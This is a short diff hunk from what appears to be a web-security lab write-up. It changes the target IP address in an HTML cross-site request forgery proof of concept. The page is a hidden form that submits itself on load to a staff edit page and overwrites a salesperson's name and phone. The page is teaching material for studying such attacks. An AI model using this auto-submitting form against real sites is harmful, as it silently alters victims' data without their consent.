@@ -59,7 +59,7 @@ This is the HTML code for the form:
 ```
 <html>
   <body onload="document.hiddenForm.submit()">
-    <form name="hiddenForm" style="display:none" action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=5" target="target" method="post">
+    <form name="hiddenForm" style="display:none" action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=5" target="target" method="post">
       <input type="text" name="first_name" value="Ken" />
       <input type="text" name="last_name" value="BARK BARK....WHO LET THE DOGS OUT" />
       <input type="text" name="phone" value="555-352-9654" />
